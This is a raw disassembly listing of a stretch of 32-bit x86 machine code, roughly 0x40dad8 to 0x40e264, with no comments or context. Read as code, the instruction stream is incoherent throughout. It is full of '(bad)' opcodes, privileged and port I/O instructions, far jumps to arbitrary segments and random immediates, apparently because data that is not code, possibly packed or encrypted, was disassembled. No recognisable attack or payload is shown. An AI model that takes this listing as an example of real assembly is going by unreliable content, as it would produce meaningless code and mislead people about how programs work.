  40dad8:	repnz loope 0x40da71
  40dadb:	(bad)  
  40dadd:	loopne 0x40dac9
  40dadf:	aas    
  40dae0:	out    0x63,eax
  40dae2:	jno    0x40db12
  40dae4:	jmp    0xac81:0xf5e79309
  40daeb:	push   es
  40daec:	fdivr  DWORD PTR [ebx]
  40daee:	sbb    BYTE PTR [esp+eiz*8-0x5c],ah
  40daf2:	fdiv   DWORD PTR [edi]
  40daf4:	jno    0x40db04
  40daf6:	push   ebx
  40daf7:	dec    DWORD PTR [esi]
  40daf9:	fist   WORD PTR [edx+0xe]
  40dafc:	not    BYTE PTR [eax+ebx*8+0x6b]
  40db00:	ss icebp 
  40db02:	inc    edi
  40db03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db04:	inc    eax
  40db05:	jno    0x40dacb
  40db07:	mov    ecx,0xbb155130
  40db0c:	xor    edi,DWORD PTR [ebx+0x51]
  40db0f:	fld    TBYTE PTR [ebp+0x4e]
  40db12:	push   esi
  40db13:	fcmovnu st,st(3)
  40db15:	outs   dx,BYTE PTR ds:[esi]
  40db16:	shl    ebp,1
  40db18:	cs ret 
  40db1a:	jbe    0x40dadb
  40db1c:	or     bh,0x6c
  40db1f:	mov    al,ds:0x78c759a8
  40db24:	scas   eax,DWORD PTR es:[edi]
  40db25:	jns    0x40db43
  40db27:	scas   eax,DWORD PTR es:[edi]
  40db28:	sub    edi,0x2d
  40db2b:	jge    0x40db4e
  40db2d:	stc    
  40db2e:	je     0x40dacb
  40db30:	push   0x2151aa07
  40db35:	sbb    al,0x14
  40db37:	mov    edx,DWORD PTR [edi-0x4634dc66]
  40db3d:	shl    DWORD PTR [esi+0x6e0f1b73],0xe7
  40db44:	test   eax,0x508e6b7c
  40db49:	ficom  DWORD PTR [edx+0x35]
  40db4c:	xor    DWORD PTR [edi],edx
  40db4e:	pop    eax
  40db4f:	mov    eax,0x16129501
  40db54:	mov    al,ds:0x78c62066
  40db59:	stos   DWORD PTR es:[edi],eax
  40db5a:	ins    DWORD PTR es:[edi],dx
  40db5b:	call   0x77d:0x31afb5df
  40db62:	inc    ebx
  40db63:	push   esp
  40db64:	loopne 0x40db21
  40db66:	or     BYTE PTR [eax+0x5c],0x82
  40db6a:	adc    ebx,DWORD PTR [esi]
  40db6c:	pushf  
  40db6d:	cld    
  40db6e:	sbb    bl,BYTE PTR [bx+di-0x31c8]
  40db73:	sbb    eax,0xdc1b1770
  40db78:	mov    al,ds:0x5437b1b6
  40db7d:	test   eax,0xcf529807
  40db82:	xchg   DWORD PTR [edx-0x4a],ecx
  40db85:	mov    ds:0xfb30f703,al
  40db8a:	test   ebp,eax
  40db8c:	(bad)  
  40db8d:	push   cs
  40db8e:	retf   0xbddc
  40db91:	adc    edi,ebx
  40db93:	fsub   DWORD PTR [eax-0x7e62eb9d]
  40db99:	shr    esi,cl
  40db9b:	mov    ss,WORD PTR [eax]
  40db9d:	inc    esi
  40db9e:	inc    edi
  40db9f:	fisub  WORD PTR [esi]
  40dba1:	xchg   ax,ax
  40dba3:	fsub   DWORD PTR [ecx-0x12]
  40dba6:	cmp    ch,BYTE PTR [ecx-0x162df816]
  40dbac:	cmp    al,0x94
  40dbae:	rcr    BYTE PTR [ebp+0x2d],0x90
  40dbb2:	rcr    DWORD PTR [edi],1
  40dbb4:	mov    ds:0x2908cb09,al
  40dbb9:	adc    bl,BYTE PTR [esp+edi*1-0x14253052]
  40dbc0:	(bad)  
  40dbc1:	inc    eax
  40dbc2:	xchg   BYTE PTR [edx+0x36],dl
  40dbc5:	mov    al,0xcc
  40dbc7:	sbb    al,0x92
  40dbc9:	outs   dx,BYTE PTR ds:[esi]
  40dbca:	clc    
  40dbcb:	jecxz  0x40dc14
  40dbcd:	fistp  DWORD PTR [eax]
  40dbcf:	adc    al,0xfd
  40dbd1:	cmp    bl,BYTE PTR [edx+0x5ef30093]
  40dbd7:	or     DWORD PTR gs:[esi+ecx*2+0x613aa3e6],esi
  40dbdf:	and    al,BYTE PTR [edx+ebx*2-0x423784ee]
  40dbe6:	dec    ebp
  40dbe7:	fwait
  40dbe8:	xor    DWORD PTR ds:0xd53aa823,esp
  40dbee:	pop    edi
  40dbef:	stos   BYTE PTR es:[edi],al
  40dbf0:	imul   eax,DWORD PTR [edx+0x77],0x2b
  40dbf4:	jge    0x40dbb9
  40dbf6:	adc    ebp,DWORD PTR [edi-0x4e]
  40dbf9:	xor    al,0xaf
  40dbfb:	bound  edi,QWORD PTR [ecx-0x3]
  40dbfe:	les    edx,FWORD PTR [ecx+0x59b86127]
  40dc04:	pop    edi
  40dc05:	jmp    0x40dc3b
  40dc07:	lea    ecx,[edx+0x6a]
  40dc0a:	mov    esi,0x78100450
  40dc0f:	sti    
  40dc10:	call   0x4c5d:0x4c66a083
  40dc17:	arpl   bp,cx
  40dc19:	jbe    0x40dbd1
  40dc1b:	stc    
  40dc1c:	in     al,dx
  40dc1d:	xchg   edi,eax
  40dc1e:	xlat   BYTE PTR ds:[ebx]
  40dc1f:	in     eax,0xfd
  40dc21:	out    dx,al
  40dc22:	add    bh,BYTE PTR [eax+0x329d5000]
  40dc28:	test   al,0x61
  40dc2a:	mov    dl,0xfb
  40dc2c:	push   ecx
  40dc2d:	jbe    0x40dc4a
  40dc2f:	mov    ds:0x265d9737,al
  40dc34:	lock in eax,0xcd
  40dc37:	repnz out dx,eax
  40dc39:	repnz aaa 
  40dc3b:	cmp    al,BYTE PTR [ebx+0x46]
  40dc3e:	xor    eax,ebp
  40dc40:	mov    cl,0xff
  40dc42:	mov    ebp,0xac69bd74
  40dc47:	xchg   ebp,eax
  40dc48:	nop
  40dc49:	pop    esi
  40dc4a:	inc    edi
  40dc4b:	pop    es
  40dc4c:	or     eax,0xa79ac84a
  40dc51:	pop    ss
  40dc52:	inc    eax
  40dc53:	jns    0x40dc74
  40dc55:	cmc    
  40dc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc57:	pop    edi
  40dc58:	push   edx
  40dc59:	mov    esp,0xd55ec522
  40dc5e:	ret    
  40dc5f:	sbb    dl,BYTE PTR [edi]
  40dc61:	dec    edi
  40dc62:	xchg   BYTE PTR [esi-0x6c3d4d7a],dl
  40dc68:	push   cs
  40dc69:	retf   
  40dc6a:	and    ebx,DWORD PTR [eax+0xf8653ad]
  40dc70:	dec    esp
  40dc71:	or     cl,BYTE PTR [ebp+0xe]
  40dc74:	xor    cl,al
  40dc76:	add    BYTE PTR [eax-0x43],bl
  40dc79:	cmp    eax,0xa3f3abb
  40dc7e:	or     ebp,edx
  40dc80:	inc    cl
  40dc82:	out    dx,eax
  40dc83:	push   ecx
  40dc84:	jecxz  0x40dca2
  40dc86:	mov    al,0x64
  40dc88:	or     ah,al
  40dc8a:	or     DWORD PTR [esp+esi*8-0x312aa3ac],ebx
  40dc91:	xor    dh,0x14
  40dc94:	lods   al,BYTE PTR ds:[esi]
  40dc95:	sub    ah,BYTE PTR [esp+esi*8]
  40dc98:	sbb    BYTE PTR [ecx],bh
  40dc9a:	stos   DWORD PTR es:[edi],eax
  40dc9b:	and    edi,DWORD PTR [ebx+0x3a]
  40dc9e:	lahf   
  40dc9f:	pushf  
  40dca0:	mov    ebx,0xbb2fd162
  40dca5:	fstp   QWORD PTR [ecx]
  40dca7:	call   0x9377d66a
  40dcac:	sar    DWORD PTR [edi],cl
  40dcae:	fst    DWORD PTR [eax+0x1b]
  40dcb1:	aas    
  40dcb2:	les    esp,FWORD PTR [edi+0x9157714]
  40dcb8:	out    dx,eax
  40dcb9:	push   esp
  40dcba:	ins    BYTE PTR es:[edi],dx
  40dcbb:	inc    eax
  40dcbc:	mov    cl,0xa7
  40dcbe:	call   0x31aee735
  40dcc3:	inc    esp
  40dcc4:	outs   dx,BYTE PTR ds:[esi]
  40dcc5:	fsubp  st(0),st
  40dcc7:	push   di
  40dcc9:	add    bl,dh
  40dccb:	sbb    eax,0x815d2220
  40dcd0:	gs jl  0x40dcf7
  40dcd3:	daa    
  40dcd4:	and    al,0xe0
  40dcd6:	xor    bl,BYTE PTR [edx+edx*2]
  40dcd9:	cmp    al,0xc
  40dcdb:	cmp    DWORD PTR [ecx],edx
  40dcdd:	sub    al,0x6f
  40dcdf:	xor    dh,BYTE PTR [eax+0x165676dd]
  40dce5:	and    ah,0x91
  40dce8:	jne    0x40dc86
  40dcea:	ds dec ebp
  40dcec:	cmp    DWORD PTR [edi],ecx
  40dcee:	call   0x320a:0x7c9ea13a
  40dcf5:	mov    esi,0x5240691c
  40dcfa:	add    ebx,DWORD PTR [esi+0x61ccc670]
  40dd00:	xchg   esp,eax
  40dd01:	or     al,0xa
  40dd03:	aad    0xf9
  40dd05:	(bad)  
  40dd06:	mov    edi,0xd72bf9a9
  40dd0b:	pusha  
  40dd0c:	adc    eax,0xc2ca11ad
  40dd11:	test   eax,0xfd153ff1
  40dd16:	dec    edi
  40dd17:	pop    ecx
  40dd18:	jle    0x40dcdd
  40dd1a:	xor    al,0x5d
  40dd1c:	lahf   
  40dd1d:	int3   
  40dd1e:	mov    eax,ds:0x40d08f52
  40dd23:	popa   
  40dd24:	mov    eax,ds:0xb65c96e6
  40dd29:	test   DWORD PTR [ebx+eiz*1-0x1a],esi
  40dd2d:	sahf   
  40dd2e:	mov    esi,0xb5a8afac
  40dd33:	sbb    esp,DWORD PTR [edi+ecx*2]
  40dd36:	cld    
  40dd37:	jnp    0x40dcc5
  40dd39:	push   eax
  40dd3a:	cmp    eax,0x779bab6b
  40dd40:	jne    0x40ddb2
  40dd42:	bnd jp 0x40dd9b
  40dd45:	pop    DWORD PTR [edx+0x2d77528d]
  40dd4b:	retf   0xfc14
  40dd4e:	shl    bl,0xa4
  40dd51:	es xchg edi,eax
  40dd53:	rol    cl,0x72
  40dd56:	and    DWORD PTR [ebx+edi*8],edi
  40dd59:	cmc    
  40dd5a:	adc    eax,0x45d1fc64
  40dd5f:	in     al,0x5a
  40dd61:	adc    al,0x85
  40dd63:	sti    
  40dd64:	jb     0x40dd32
  40dd66:	adc    BYTE PTR [esp+ebx*8+0xe],ah
  40dd6a:	(bad)  
  40dd6b:	loopne 0x40dd60
  40dd6d:	(bad)  
  40dd6e:	lods   eax,DWORD PTR ds:[esi]
  40dd6f:	mov    edx,0xf4f84fb8
  40dd74:	scas   eax,DWORD PTR es:[edi]
  40dd75:	test   al,bl
  40dd77:	pop    edi
  40dd78:	js     0x40ddf9
  40dd7a:	sub    DWORD PTR [edx+0x30],0x67
  40dd7e:	lods   eax,DWORD PTR ds:[esi]
  40dd7f:	dec    esp
  40dd80:	inc    edi
  40dd81:	xchg   DWORD PTR [esi+0x1c],ebx
  40dd84:	into   
  40dd85:	ss je  0x40dd33
  40dd88:	push   ds
  40dd89:	sub    eax,0x436bc491
  40dd8e:	je     0x40dd9c
  40dd90:	repz xchg ecx,eax
  40dd92:	sbb    eax,esi
  40dd94:	xchg   esi,esi
  40dd96:	cmp    DWORD PTR [ecx+0xb048289],esi
  40dd9c:	push   esp
  40dd9d:	pop    ebp
  40dd9e:	xor    eax,0xcfcf3997
  40dda3:	sbb    al,cl
  40dda5:	inc    ebp
  40dda6:	scas   al,BYTE PTR es:[edi]
  40dda7:	shl    ch,1
  40dda9:	xor    DWORD PTR [esi+edi*2-0x51],edx
  40ddad:	jmp    0xbeed8d1f
  40ddb2:	int    0x1c
  40ddb4:	dec    esp
  40ddb5:	xchg   edi,eax
  40ddb6:	sbb    DWORD PTR [ebx-0x2d468e15],edi
  40ddbc:	loop   0x40de21
  40ddbe:	push   0x692a2c96
  40ddc3:	ins    DWORD PTR es:[edi],dx
  40ddc4:	push   esp
  40ddc5:	adc    eax,0xd4f952e8
  40ddca:	inc    ebx
  40ddcb:	pushf  
  40ddcc:	(bad)  
  40ddcd:	das    
  40ddce:	pop    esp
  40ddcf:	dec    esp
  40ddd0:	icebp  
  40ddd1:	stos   DWORD PTR es:[edi],eax
  40ddd2:	loopne 0x40dd8e
  40ddd4:	mov    ch,BYTE PTR [eax-0x599224ba]
  40ddda:	push   ds
  40dddb:	pusha  
  40dddc:	cmp    BYTE PTR [edx],ch
  40ddde:	adc    DWORD PTR [ebx],ebx
  40dde0:	jmp    0x32319977
  40dde5:	jb     0x40dd86
  40dde7:	les    eax,FWORD PTR gs:[esi-0x49457c]
  40ddee:	ja     0x40de42
  40ddf0:	cli    
  40ddf1:	das    
  40ddf2:	int    0x18
  40ddf4:	in     eax,0xcb
  40ddf6:	cmp    edx,DWORD PTR [eax]
  40ddf8:	or     al,0xc6
  40ddfa:	cld    
  40ddfb:	mov    ecx,edi
  40ddfd:	in     al,0xfd
  40ddff:	sti    
  40de00:	or     eax,0x28156b0e
  40de05:	inc    esi
  40de06:	inc    esp
  40de07:	lods   al,BYTE PTR ds:[esi]
  40de08:	mul    ecx
  40de0a:	jmp    FWORD PTR [edx-0x52d25c12]
  40de10:	(bad)  [edi-0x3]
  40de13:	xor    al,0x3c
  40de15:	sbb    cx,di
  40de18:	adc    eax,DWORD PTR [edx-0x672c22d7]
  40de1e:	mov    ch,0x38
  40de20:	mov    ebp,0xf4ef1b96
  40de25:	or     al,0x3
  40de27:	into   
  40de28:	lea    ebp,[edx]
  40de2a:	fstp   DWORD PTR [edx-0x39]
  40de2d:	loope  0x40de3e
  40de2f:	out    0x48,eax
  40de31:	rol    BYTE PTR ds:0xf3881f75,cl
  40de37:	fild   WORD PTR [eax+ecx*1]
  40de3a:	dec    ecx
  40de3b:	push   es
  40de3c:	push   edi
  40de3d:	jne    0x40dde9
  40de3f:	test   eax,0x78bf0037
  40de44:	int3   
  40de45:	and    ah,BYTE PTR [ebp+0x7f]
  40de48:	sub    esi,0x469a2d7a
  40de4e:	ss addr16 loop 0x40de93
  40de52:	fnstenv [ebx-0x74caeb4b]
  40de58:	neg    BYTE PTR [edi+0x2048e02a]
  40de5e:	jbe    0x40de83
  40de60:	xchg   esp,eax
  40de61:	push   eax
  40de62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de63:	or     al,BYTE PTR [eax-0x64ec1d77]
  40de69:	jae    0x40dea1
  40de6b:	pusha  
  40de6c:	mov    dh,0x5b
  40de6e:	loope  0x40de4f
  40de70:	stos   BYTE PTR es:[edi],al
  40de71:	lahf   
  40de72:	mov    DWORD PTR [edi+eax*4+0x4da8fe46],ecx
  40de79:	mov    cs,WORD PTR [ebp+0x357720e0]
  40de7f:	ret    
  40de80:	ds pop ebx
  40de82:	leave  
  40de83:	dec    edx
  40de84:	pushf  
  40de85:	add    DWORD PTR [eax-0x7d],edi
  40de88:	and    ah,ch
  40de8a:	fs out dx,al
  40de8c:	ins    BYTE PTR es:[edi],dx
  40de8d:	mov    bh,0xa7
  40de8f:	test   eax,0x2c715bc4
  40de94:	in     eax,0xf5
  40de96:	shl    DWORD PTR [eax],cl
  40de98:	inc    ecx
  40de99:	mov    fs,WORD PTR [ecx+ecx*2+0x39fb9f30]
  40dea0:	xchg   esp,eax
  40dea1:	xchg   esi,eax
  40dea2:	mov    dl,0x72
  40dea4:	ja     0x40de73
  40dea6:	cwde   
  40dea7:	xchg   DWORD PTR es:[ebx-0x12488b],esp
  40deae:	stc    
  40deaf:	pop    esp
  40deb0:	call   0x5b1a:0xc81cb01b
  40deb7:	mov    BYTE PTR [esi+0x11e71de9],cl
  40debd:	jns    0x40de9e
  40debf:	push   ebx
  40dec0:	jbe    0x40de6b
  40dec2:	push   0xfffffff8
  40dec4:	ins    BYTE PTR es:[edi],dx
  40dec5:	push   ecx
  40dec6:	pop    edi
  40dec7:	(bad)  
  40dec9:	push   ebp
  40deca:	pop    ds
  40decb:	sub    DWORD PTR [eax+0x485d207b],edi
  40ded1:	ss jae 0x40df46
  40ded4:	aam    0xd
  40ded6:	shr    edi,0x49
  40ded9:	call   0xd03a:0xc94f824d
  40dee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dee1:	push   esp
  40dee2:	js     0x40defa
  40dee4:	pop    edi
  40dee5:	adc    ecx,DWORD PTR [eax+0x3d]
  40dee8:	popa   
  40dee9:	(bad)  
  40deeb:	inc    edx
  40deec:	ins    BYTE PTR es:[edi],dx
  40deed:	mov    eax,ds:0x83335626
  40def2:	aam    0xd7
  40def4:	add    eax,0x29653d2e
  40def9:	xchg   esp,eax
  40defa:	test   al,0xdc
  40defc:	ds mov es,ebx
  40deff:	in     eax,dx
  40df00:	jl     0x40deb8
  40df02:	dec    edx
  40df03:	pop    edi
  40df04:	fmul   QWORD PTR [ebx-0x4b]
  40df07:	jnp    0x40dec1
  40df09:	jmp    0xeb60:0xae7c3e46
  40df10:	mov    ebp,0x1736b328
  40df15:	add    BYTE PTR [eax-0x809d4ea],cl
  40df1b:	inc    eax
  40df1c:	int3   
  40df1d:	pop    es
  40df1e:	jnp    0x40df73
  40df20:	sbb    ebp,DWORD PTR [edi]
  40df22:	cmp    eax,0x9a394243
  40df27:	sub    WORD PTR [ecx+0x77d52cec],si
  40df2e:	push   0x70
  40df30:	sti    
  40df31:	fnstenv [eax+0x1800aad4]
  40df37:	mov    al,ds:0x5e4c7077
  40df3c:	test   eax,0xa5ffd8ab
  40df41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df42:	(bad)  
  40df43:	or     eax,0x3ff72abc
  40df48:	(bad)  
  40df4a:	dec    edx
  40df4b:	mov    bh,0xae
  40df4d:	lods   eax,DWORD PTR ds:[esi]
  40df4e:	mov    esi,0x3326b715
  40df53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df54:	(bad)  
  40df55:	jmp    0xaf1b:0xafdd8505
  40df5c:	lock ret 0x1a5f
  40df60:	and    al,0x3f
  40df62:	(bad)  
  40df63:	sub    edx,esi
  40df65:	retf   
  40df66:	jl     0x40df39
  40df68:	push   eax
  40df69:	aad    0x37
  40df6b:	and    esp,DWORD PTR [ebx]
  40df6d:	bound  ebp,QWORD PTR ds:0x22c3c887
  40df73:	inc    esp
  40df74:	xchg   edi,eax
  40df75:	pop    esp
  40df76:	fst    QWORD PTR [esi]
  40df78:	icebp  
  40df79:	sub    dh,BYTE PTR [eax+eiz*4+0x16]
  40df7d:	inc    edx
  40df7e:	mov    edx,0x8cb01590
  40df83:	push   ebx
  40df84:	sub    ebx,DWORD PTR [edx]
  40df86:	icebp  
  40df87:	cmp    esi,DWORD PTR [edi]
  40df89:	inc    esp
  40df8a:	sar    DWORD PTR [ebx],0x6d
  40df8d:	pop    esi
  40df8e:	hlt    
  40df8f:	inc    esi
  40df90:	xchg   ecx,eax
  40df91:	fsubr  QWORD PTR [eax+edx*2]
  40df94:	sti    
  40df95:	sub    bl,BYTE PTR [esi-0x3e70cada]
  40df9b:	sbb    BYTE PTR [eax+0x4d],al
  40df9e:	pop    edi
  40dfa0:	jnp    0x40dfcc
  40dfa2:	sub    BYTE PTR [edi],ch
  40dfa4:	bound  ebx,QWORD PTR [edx]
  40dfa6:	enter  0x57c7,0xd3
  40dfaa:	sub    BYTE PTR [ebx+ebx*4+0x1b],ah
  40dfae:	retf   
  40dfaf:	jg     0x40df53
  40dfb1:	cld    
  40dfb2:	jmp    0xc373:0x307ca8ff
  40dfb9:	add    DWORD PTR [edi-0xd781db8],edx
  40dfbf:	mov    ecx,0xbaca30f3
  40dfc4:	push   0xffffffa5
  40dfc6:	neg    BYTE PTR [ebp+0x6120f564]
  40dfcc:	sbb    DWORD PTR [edx+eax*4],0xffffffe5
  40dfd0:	(bad)  
  40dfd1:	or     BYTE PTR [edx-0x61cbc69d],dl
  40dfd7:	adc    eax,DWORD PTR [edx]
  40dfd9:	loopne 0x40e004
  40dfdb:	stc    
  40dfdc:	lea    edi,[esi-0x3]
  40dfdf:	adc    DWORD PTR [eax+0x6b8bdfa4],edi
  40dfe5:	les    ebp,FWORD PTR [esi+0x43]
  40dfe8:	mov    DWORD PTR [ebx],esp
  40dfea:	or     eax,0x1af75778
  40dfef:	add    BYTE PTR [ebx+ebp*4-0x19bb473a],dl
  40dff6:	jmp    0x101861ad
  40dffb:	sahf   
  40dffc:	ret    0x4026
  40dfff:	enter  0x9257,0x9a
  40e003:	or     DWORD PTR [edi],ebx
  40e005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e006:	lock inc esp
  40e008:	dec    eax
  40e009:	xor    BYTE PTR [edx],dl
  40e00b:	inc    eax
  40e00c:	push   0x8
  40e00e:	push   edx
  40e00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e010:	arpl   cx,dx
  40e012:	inc    esi
  40e013:	sub    BYTE PTR [eax-0x5e],cl
  40e016:	fcmovnu st,st(2)
  40e018:	ss hlt 
  40e01a:	push   0xffffff80
  40e01c:	into   
  40e01d:	and    ch,BYTE PTR [edi]
  40e01f:	(bad)  
  40e020:	(bad)  
  40e021:	push   eax
  40e022:	mov    esi,0x38f5c60f
  40e027:	add    ebp,DWORD PTR [edx]
  40e029:	fmul   DWORD PTR [ebx]
  40e02b:	mov    dl,0xb9
  40e02d:	xchg   esp,eax
  40e02e:	out    dx,eax
  40e02f:	(bad)  
  40e030:	in     eax,dx
  40e031:	mov    dh,0x8b
  40e033:	and    eax,0xbc9825d3
  40e038:	cwde   
  40e039:	cwde   
  40e03a:	push   es
  40e03b:	das    
  40e03c:	hlt    
  40e03d:	xchg   DWORD PTR [ecx-0x41d22a7e],edi
  40e043:	mov    edi,esi
  40e045:	mov    DWORD PTR [ebx+0x671e1e77],ecx
  40e04b:	pushf  
  40e04c:	mov    eax,ds:0xf2faf71a
  40e051:	xchg   ebp,eax
  40e052:	mov    ds:0x7e80df76,eax
  40e057:	fnstsw WORD PTR [ecx+0xa]
  40e05a:	inc    edi
  40e05b:	jns    0x40e0bf
  40e05d:	sub    dh,BYTE PTR [eax]
  40e05f:	fxch   st(4)
  40e061:	and    al,0x51
  40e063:	fbstp  TBYTE PTR [eax-0x5]
  40e066:	les    ecx,FWORD PTR [esi-0x14]
  40e069:	fild   QWORD PTR es:[esi+edi*1]
  40e06d:	add    cl,BYTE PTR [ebx]
  40e06f:	mov    edx,0xdf6bc6ab
  40e074:	mov    edx,0x67e222d1
  40e079:	mov    dh,0x17
  40e07b:	ret    
  40e07c:	out    0x11,eax
  40e07e:	cmp    esp,ebx
  40e080:	or     eax,0xf1705053
  40e085:	cmp    edx,DWORD PTR [ecx]
  40e087:	int    0x3
  40e089:	mov    esi,0x5f73f946
  40e08e:	pop    eax
  40e08f:	jle    0x40e0c1
  40e091:	xor    al,0x94
  40e093:	(bad)  
  40e094:	pop    ds
  40e095:	jb     0x40e066
  40e097:	adc    bh,BYTE PTR [edx+eax*1-0x7fc4c561]
  40e09e:	inc    edx
  40e09f:	sub    DWORD PTR [ecx],edx
  40e0a1:	test   DWORD PTR [ebx+0x24],esi
  40e0a4:	fldcw  WORD PTR [ecx-0x2]
  40e0a7:	or     eax,0xc902c185
  40e0ac:	stos   DWORD PTR es:[edi],eax
  40e0ad:	mov    ah,0x92
  40e0af:	sub    al,0x86
  40e0b1:	or     al,BYTE PTR [edx+0x40c2afd8]
  40e0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b8:	or     ebp,0xffffffb2
  40e0bb:	add    al,0x9f
  40e0bd:	ds popa 
  40e0bf:	pushf  
  40e0c0:	(bad)  
  40e0c1:	xlat   BYTE PTR ds:[ebx]
  40e0c2:	mov    al,ds:0xf901200
  40e0c7:	inc    edi
  40e0c8:	cmp    dl,dh
  40e0ca:	push   ss
  40e0cb:	mov    cl,0xd1
  40e0cd:	in     al,dx
  40e0ce:	push   ebx
  40e0cf:	(bad)  
  40e0d1:	enter  0xabce,0x19
  40e0d5:	data16 sbb al,0x71
  40e0d8:	loope  0x40e07b
  40e0da:	adc    cl,BYTE PTR [ecx-0x24d753c8]
  40e0e0:	sbb    al,0xf7
  40e0e2:	add    cl,bh
  40e0e4:	iret   
  40e0e5:	aas    
  40e0e6:	jg     0x40e148
  40e0e8:	js     0x40e145
  40e0ea:	adc    BYTE PTR [edi-0x5267db60],cl
  40e0f0:	dec    edx
  40e0f1:	cld    
  40e0f2:	retf   
  40e0f3:	sbb    al,0x7f
  40e0f5:	xchg   esi,eax
  40e0f6:	jbe    0x40e0b1
  40e0f8:	int    0x9c
  40e0fa:	pop    eax
  40e0fb:	adc    eax,0xa7a8ace5
  40e100:	mov    eax,ds:0x271318d1
  40e105:	rol    BYTE PTR [ecx+eiz*1],0xbc
  40e109:	jns    0x40e0dd
  40e10b:	pop    ebp
  40e10c:	ja     0x40e129
  40e10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e10f:	xor    esp,eax
  40e111:	hlt    
  40e112:	mul    BYTE PTR [ecx+0x13]
  40e115:	(bad)  
  40e116:	sbb    al,0xf0
  40e118:	loopne 0x40e0eb
  40e11a:	mov    WORD PTR [edi+0x26],?
  40e11d:	fsub   QWORD PTR [edx+0x98ab980]
  40e123:	jb     0x40e0f5
  40e125:	sub    eax,0x7dba30b3
  40e12a:	mov    DWORD PTR [edi-0x57594013],edi
  40e130:	cmc    
  40e131:	aad    0x8
  40e133:	jne    0x40e0ee
  40e135:	cdq    
  40e136:	or     dl,BYTE PTR [edx+edi*2+0x5c054185]
  40e13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13e:	or     cl,BYTE PTR [edx-0x16]
  40e141:	mov    ah,0x4f
  40e143:	into   
  40e144:	adc    BYTE PTR [edx-0x60],cl
  40e147:	bound  ebp,QWORD PTR [ebx+0x4187ff3f]
  40e14d:	or     DWORD PTR [edi],esp
  40e14f:	mov    WORD PTR ds:0x2319132d,es
  40e155:	test   al,0x8c
  40e157:	adc    BYTE PTR [ebx-0x60386f83],al
  40e15d:	out    dx,eax
  40e15e:	lock jl 0xa42a86af
  40e165:	jecxz  0x40e10c
  40e167:	sub    dl,BYTE PTR ds:0x2d018c98
  40e16d:	add    eax,0x5da2b437
  40e172:	mov    WORD PTR [esi-0x2b],fs
  40e175:	data16 jae 0x40e169
  40e178:	sbb    BYTE PTR [esp-0x6a],dh
  40e17c:	xor    eax,0xf47df3ee
  40e181:	adc    DWORD PTR [eax-0x79ef3eda],0xffffffbf
  40e188:	dec    ecx
  40e189:	dec    esp
  40e18a:	test   ebx,eax
  40e18c:	ja     0x40e1fb
  40e18e:	jmp    0x9736aaea
  40e193:	pop    es
  40e194:	in     al,0x71
  40e196:	mov    bh,0x71
  40e198:	mov    al,0x91
  40e19a:	fnstsw WORD PTR [ebx]
  40e19c:	popf   
  40e19d:	sub    eax,0xb08f3ed1
  40e1a2:	call   0x89324f22
  40e1a7:	loopne 0x40e1af
  40e1a9:	add    ebx,edi
  40e1ab:	aaa    
  40e1ac:	mov    ah,0x58
  40e1ae:	test   al,0xd9
  40e1b0:	addr16 mov eax,0xdc9623d3
  40e1b6:	aas    
  40e1b7:	fs mov esp,0x56fa7367
  40e1bd:	mov    bl,0xf3
  40e1bf:	cwde   
  40e1c0:	(bad)  
  40e1c1:	jnp    0x40e19b
  40e1c3:	loope  0x40e162
  40e1c5:	ja     0x40e245
  40e1c7:	cwde   
  40e1c8:	jno    0x40e1b1
  40e1ca:	hlt    
  40e1cb:	(bad)  
  40e1cc:	sbb    DWORD PTR [eax-0x75307a86],ebp
  40e1d2:	add    eax,0x7a6b81f8
  40e1d7:	pop    edi
  40e1d8:	pop    esi
  40e1d9:	hlt    
  40e1da:	jno    0x40e240
  40e1dc:	push   ebx
  40e1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1de:	dec    esi
  40e1df:	xchg   edi,eax
  40e1e0:	loop   0x40e205
  40e1e2:	add    eax,DWORD PTR [esi]
  40e1e4:	into   
  40e1e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e6:	ret    0x1fea
  40e1e9:	xchg   ebx,eax
  40e1ea:	in     eax,0x38
  40e1ec:	ret    
  40e1ed:	fisttp QWORD PTR [edi-0x637905f5]
  40e1f3:	jo     0x40e270
  40e1f5:	fmul   QWORD PTR [edx]
  40e1f7:	fs inc eax
  40e1f9:	test   DWORD PTR [ebp-0x80],ebx
  40e1fc:	cmp    DWORD PTR [ebp+0x60],esp
  40e1ff:	mov    edx,DWORD PTR [eax+0x3194ec36]
  40e205:	pop    ecx
  40e206:	xor    ebx,DWORD PTR ds:0xc6a32b16
  40e20c:	jbe    0x40e28b
  40e20e:	dec    ecx
  40e20f:	or     DWORD PTR [eax],0xeb8cfba7
  40e215:	and    ah,BYTE PTR [eax-0x4c]
  40e218:	imul   esp,DWORD PTR [edi],0xffffffda
  40e21b:	adc    BYTE PTR [eax-0x52],cl
  40e21e:	scas   eax,DWORD PTR es:[edi]
  40e21f:	popf   
  40e220:	dec    esi
  40e221:	jns    0x40e226
  40e223:	call   0x557:0x4af511cf
  40e22a:	xchg   ecx,eax
  40e22b:	sbb    BYTE PTR [ebx+0x4b0560b5],al
  40e231:	inc    esp
  40e232:	dec    esp
  40e233:	mov    ah,dl
  40e235:	pop    ebx
  40e236:	test   BYTE PTR es:[esi+0x47],ah
  40e23a:	mov    bh,0xb2
  40e23c:	arpl   WORD PTR [edx+0x73ec6efb],dx
  40e242:	scas   al,BYTE PTR es:[edi]
  40e243:	cmp    eax,0xa4743c2f
  40e248:	adc    edx,edx
  40e24a:	mov    bh,0xb9
  40e24c:	adc    ebx,DWORD PTR [ebx]
  40e24e:	call   0x7e99f2fa
  40e253:	cmp    ah,bh
  40e255:	pusha  
  40e256:	stc    
  40e257:	xchg   esi,eax
  40e258:	and    DWORD PTR [ebx+eax*1-0x48bf05e3],edi
  40e25f:	iret   
  40e260:	test   al,0x90
  40e262:	fnstenv [ecx]
  40e264:	aas    
